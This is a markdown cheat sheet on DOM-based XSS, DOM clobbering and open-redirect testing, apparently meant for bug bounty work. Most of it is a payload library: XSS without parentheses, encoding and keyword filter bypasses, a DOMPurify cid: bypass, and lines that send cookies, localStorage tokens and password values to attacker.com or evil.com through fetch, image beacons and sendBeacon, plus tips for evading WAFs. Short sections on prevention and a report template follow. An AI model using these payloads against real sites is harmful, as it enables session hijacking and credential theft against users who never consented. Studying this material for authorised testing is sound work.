


# 🛡️ DOM-Based Vulnerabilities Cheat Sheet

---

## 🎯 Quick Start: What is DOM-Based?

```
DOM = Document Object Model
→ Browser's representation of HTML page
→ JavaScript can read/change it

DOM-Based Vuln = User input → JavaScript → Dangerous function (Sink) → Attack
```

**Key Difference:**
| Traditional XSS | DOM-Based XSS |
|----------------|---------------|
| Payload in server response | Payload executed by client-side JS |
| Fix on server | Fix in JS code |
| Easy to see in source | Need DevTools to see |

---

## 🔍 Discovery: Where to Find DOM-Based Vulns

### Step 1: Find User Input Sources (Sources)

```javascript
// Check these in DevTools > Sources (Ctrl+Shift+F)

// URL-based sources:
location.hash          // #fragment
location.search        // ?param=value
location.href          // full URL
document.URL
document.referrer      // where user came from
window.name            // iframe name

// Storage sources:
localStorage
sessionStorage
document.cookie

// Other:
postMessage data
URL parameters reflected in page
```

### Step 2: Find Dangerous Functions (Sinks)

```javascript
 Code execution sinks:
eval()
setTimeout(string)
setInterval(string)
new Function()
constructor.constructor()

 HTML injection sinks:
innerHTML
outerHTML
document.write()
insertAdjacentHTML()

 Navigation sinks (Open Redirect):
location = ...
location.href = ...
location.replace()
location.assign()
window.open()

 Other dangerous sinks:
element.src = ...
element.setAttribute('src', ...)
$.ajax({url: ...})      // jQuery
XMLHttpRequest.open()
```

### Step 3: Test for Vulnerability

```bash
 1. Inject test string in each source:
?test=XYZ123
 #test=XYZ123

2. Open DevTools > Elements (NOT View Source!)
3. Search for "XYZ123" with Ctrl+F
4. Check context:
    - Inside <script>? → JS context
    - Inside <div>? → HTML context  
    - Inside "value"? → Attribute context

 5. Try simple payload based on context:
 HTML context: <img src=x onerror=alert`1`>
 JS context: ';alert`1`//
 Attribute: " onerror=alert`1` "
```

### Step 4: Confirm Execution

```javascript
// In DevTools Console:
console.log(typeof suspiciousVar)  // Check if clobbered
// Or watch Network tab for fetch() requests
// Or watch for alert()/print() execution
```

---

## 💥 Payload Library (No-Parentheses Style)

### 🎨 Basic XSS Payloads (Avoid `()`)

```javascript
// Using backticks (template literals):
alert`1`
fetch`https://attacker.com/?c=${document.cookie}`
location`javascript:alert\`1\``

// Using constructor:
constructor.constructor`alert\`1\``()
[].filter.constructor`alert\`1\``()

// Using String.fromCharCode:
alert(String.fromCharCode(97,108,101,114,116,49))  // alert1
constructor.constructor(String.fromCharCode(97,108,101,114,116,40,49,41))()  // alert(1)

// Using atob (Base64):
constructor.constructor(atob('YWxlcnQoMSk='))()  // alert(1)

// Using throw + onerror (no () at all):
onerror=alert;throw`1`
onerror=fetch;throw`https://attacker.com/?c=${document.cookie}`

// Using Unicode escaping:
\u0061\u006c\u0065\u0072\u0074`1`  // alert`1`
```

### 🔄 DOM Clobbering Payloads

```html
<!-- Level 1: x.y = "value" -->
<a id=x><a id=x name=y href="CLOBBERED">

<!-- Level 2: x.y.value = "value" -->
<form id=x><output id=y>CLOBBERED</output>

<!-- Level 3: x.y.z (3 levels) -->
<form id=x name=y><input id=z value="CLOBBERED"></form>
<form id=x></form>  <!-- Second form creates HTMLCollection -->

<!-- Level 4+: Deep nesting with iframe -->
<iframe name=a srcdoc="<iframe name=b srcdoc='<a id=c name=d href=CLOBBERED>'>">
<style>@import"https://google.com";</style>  <!-- Delay for iframe load -->

<!-- Clobbering attributes property (bypass filters) -->
<form id=target><input id=attributes>

<!-- Clobbering with cid: protocol (bypass DOMPurify) -->
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert`1`//">
```

### 🌐 Open Redirection Payloads

```javascript
// Basic redirect:
location`https://evil.com`
location.href`https://evil.com`

// With cookie exfiltration:
location`https://evil.com/?c=${document.cookie}`

// Bypass filter on "location" keyword:
locati\u006fn`https://evil.com`  // \u006f = 'o'

// Using javascript: protocol (if allowed):
location`javascript:fetch\`https://attacker.com/?c=${document.cookie}\``

// Regex bypass (when filter checks domain):
#https://trusted.com.evil.com  // Contains "trusted.com" but redirects to evil.com
```

### 🧩 Context-Breaking Payloads

```javascript
// Break out of JS string:
';payload//
";payload//
`;payload//

// Break out of HTML attribute:
" onerror=payload "
' onerror=payload '

// Break out of JSON (for eval() sinks):
\";payload;//

// Using newline as statement separator (instead of ;):
%0apayload%0a  // %0a = line feed

// Comment out remaining code:
//
/* */
-->
```

---

## 🛠️ Filter Bypass Techniques

### 🔓 Encoding Bypasses

```javascript
// URL encoding (if filter doesn't decode):
%3Cimg%20src=x%20onerror=alert%601%60%3E

// HTML entities (if filter doesn't decode):
&lt;img src=x onerror=alert`1`&gt;

// Unicode escapes (bypass keyword filters):
\u0061\u006c\u0065\u0072\u0074`1`  // alert`1`
\x61\x6c\x65\x72\x74`1`  // alert`1`

// Hex encoding in strings:
String.fromCharCode(0x61,0x6c,0x65,0x72,0x74)`1`

// Base64 (with atob):
atob('YWxlcnQoMSk=')  // alert(1)

// Mixed encoding (harder to filter):
\u0061lert`1`  // Only encode first char
```

### 🎭 Keyword Evasion

```javascript
// Split keywords:
'ale'+'rt'`1`
['a','l','e','r','t'].join`` `1`

// Array access:
self['al'+'ert']`1`
window[/al/.source+/ert/.source]`1`

// Using constructor to build function name:
constructor.constructor('ale'+'rt')`1`

// Case variation (if filter is case-sensitive):
AlErT`1`
aLeRt`1`
```

### 🧱 Regex/Blacklist Bypasses

```javascript
// If filter blocks "script":
<svg onload=payload>
<img src=x onerror=payload>
<details open ontoggle=payload>
<body onload=payload>

// If filter blocks "onerror":
<svg onload=payload>
<details open ontoggle=payload>
<marquee onstart=payload>

// If filter blocks "alert":
print()
confirm(1)
prompt(1)
self['ale'+'rt']`1`

// If filter blocks parentheses ():
alert`1`  // backticks
throw`1`  // with onerror handler
constructor.constructor`code`()`  // only () for final call
```

### 🔄 Double-Encoding / Timing Attacks

```javascript
// Double URL encoding (if filter decodes once):
%253Cimg%2520src=x%2520onerror=alert%25601%2560%253E
// After 1st decode: %3Cimg src=x onerror=alert`1`%3E
// After browser parse: <img src=x onerror=alert`1`>

// DOMPurify cid: trick (doesn't encode quotes):
<a id=x name=y href="cid:&quot;onerror=alert`1`//">
// &quot; passes filter → decoded to " at runtime → breaks attribute
```

---

## 🎯 POC Creation Guide

### Step 1: Minimal Working POC

```javascript
// For DOM XSS:
?param=<img src=x onerror=alert`1`>

// For DOM Clobbering:
?param=<a id=config><a id=config name=url href=//evil.com/x.js>

// For Open Redirect:
?next=https://evil.com
// or
#https://evil.com
```

### Step 2: Add Data Exfiltration

```javascript
// Steal cookies:
fetch`https://attacker.com/?c=${document.cookie}`

// Steal localStorage:
fetch`https://attacker.com/?data=${localStorage.getItem('token')}`

// Steal specific form field:
fetch`https://attacker.com/?val=${document.getElementById('password').value}`
```

### Step 3: Make It Stealthy

```javascript
// Use Image beacon (no CORS issues):
(new Image).src=`https://attacker.com/?c=${document.cookie}`

// Use sendBeacon (fires even on page unload):
navigator.sendBeacon(`https://attacker.com/?c=${document.cookie}`)

// Encode data to avoid WAF:
fetch`https://attacker.com/?c=${btoa(document.cookie)}`  // Base64 encode
```

### Step 4: Auto-Execution Tricks

```html
<!-- For DOM Clobbering that needs focus: -->
<iframe src="https://target.com/page" onload="this.src+='#x'">

<!-- For hashchange events: -->
<iframe src="https://target.com/#" onload="this.src+='<payload>'">

<!-- For delayed execution: -->
<script>setTimeout(()=>location=`https://evil.com`,1000)</script>
```

---

## 🧪 Testing Checklist

### Before Exploiting:
- [ ] Found user input reflected in page? (DevTools > Elements)
- [ ] Identified Source (location.hash, search, etc.)?
- [ ] Identified Sink (innerHTML, eval, location, etc.)?
- [ ] Tested basic payload in context?
- [ ] Checked for filters/encoding?

### During Exploitation:
- [ ] Payload executes in my browser?
- [ ] No console errors?
- [ ] Data exfiltration working? (check Network tab)
- [ ] Tested with different browsers? (Chrome/Firefox behave differently)

### After Success:
- [ ] Document exact payload + URL
- [ ] Note browser/version where it works
- [ ] Capture screenshot/video of execution
- [ ] Test if payload persists (Stored DOM XSS)

---

## 🛡️ Prevention Tips (For Reports)

### For Developers:

```javascript
// ❌ Dangerous pattern:
let config = window.config || {};

// ✅ Safe pattern:
let config = (window.config && 
              typeof window.config === 'object' && 
              !window.config.nodeType) 
             ? window.config 
             : {};

// ❌ Dangerous:
element.innerHTML = userInput;

// ✅ Safe:
element.textContent = userInput;
// Or use DOMPurify:
element.innerHTML = DOMPurify.sanitize(userInput);

// ❌ Dangerous:
location.href = userInput;

// ✅ Safe:
const allowed = ['trusted.com'];
const url = new URL(userInput);
if (allowed.includes(url.hostname)) {
    location.href = userInput;
}
```

### For Security Teams:

```
1. Implement CSP: 
   Content-Security-Policy: default-src 'self'; script-src 'self'

2. Use Subresource Integrity for external scripts:
   <script src="..." integrity="sha384-..."></script>

3. Set HttpOnly flag on cookies to prevent JS access

4. Use modern frameworks with auto-escaping (React, Vue, Angular)

5. Regular code review for dangerous sinks + user input
```

---

## 🧰 Tools & Resources

### Browser DevTools (Free):

```
Chrome/Firefox DevTools:
- Elements tab: See live DOM (NOT View Source!)
- Console tab: Test payloads, check variables
- Sources tab: Search JS code, set breakpoints
- Network tab: Watch fetch/XHR requests
```

### Online Tools:

-  [yeswehack/Dom-Explorer Live](https://yeswehack.github.io/Dom-Explorer/dom-explorer#eyJpbnB1dCI6IiIsInBpcGVsaW5lcyI6W3siaWQiOiJ0ZGpvZjYwNSIsIm5hbWUiOiJEb20gVHJlZSIsInBpcGVzIjpbeyJuYW1lIjoiRG9tUGFyc2VyIiwiaWQiOiJhYjU1anN2YyIsImhpZGUiOmZhbHNlLCJza2lwIjpmYWxzZSwib3B0cyI6eyJ0eXBlIjoidGV4dC9odG1sIiwic2VsZWN0b3IiOiJib2R5Iiwib3V0cHV0IjoiaW5uZXJIVE1MIiwiYWRkRG9jdHlwZSI6dHJ1ZX19XX1dfQ==) - Reveal how browsers parse HTML and find mutated XSS vulnerabilities
-  [SoheilKhodayari/DOMClobbering](https://domclob.xyz/domc_markups/list) - Comprehensive List of DOM Clobbering Payloads for Mobile and Desktop Web Browsers

### Reference Links:

- PortSwigger DOM XSS: https://portswigger.net/web-security/dom-based
- HackTricks DOM Clobbering: https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering
- 1. PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/DOM%20Clobbering

---

## 📝 Report Template (Copy-Paste Ready)

```markdown
## Vulnerability: [DOM XSS / DOM Clobbering / Open Redirect]
### Severity: [High/Critical]
### Endpoint: `https://target.com/page?param=`

### Summary
[Brief 1-2 line description]

### Steps to Reproduce
1. Visit: `https://target.com/page?param=[PAYLOAD]`
2. [Action user takes, e.g., "Click submit" or "Page loads"]
3. Observe: [What happens, e.g., "alert box appears" or "redirect to evil.com"]

### Technical Details
- **Source**: `[location.hash / location.search / etc.]`
- **Sink**: `[innerHTML / eval / location / etc.]`
- **Context**: `[HTML / JS string / attribute / etc.]`
- **Filter Bypass**: `[Technique used, e.g., "backticks to avoid ()", "Unicode escape for keyword"]`

### Payload
```javascript
[PASTE FINAL PAYLOAD HERE]
```

---

## 🎓 Key Mindset Tips

```
🔑 Rule #1: Context is King
→ Same payload, different context = different result
→ Always check: HTML? JS string? Attribute? JSON?

🔑 Rule #2: Sources → Sinks → Flow
→ Find where user input enters (Source)
→ Find where it's used dangerously (Sink)  
→ Trace the path between them

🔑 Rule #3: Filters are Patterns, Not Walls
→ Blacklist? Try encoding, splitting, case variation
→ Regex? Test edge cases, double-encoding, timing
→ Whitelist? Look for logic flaws, parameter pollution

🔑 Rule #4: No ()? No Problem
→ backticks: alert`1`
→ constructor: [].filter.constructor`code`
→ throw+onerror: onerror=alert;throw`1`
→ String.fromCharCode / atob for obfuscation

🔑 Rule #5: DOM Clobbering = HTML as Weapon
→ <a id=x name=y href=z> creates x.y = "z"
→ Use when XSS blocked but HTML injection allowed
→ Great for bypassing CSP in some cases
```

---

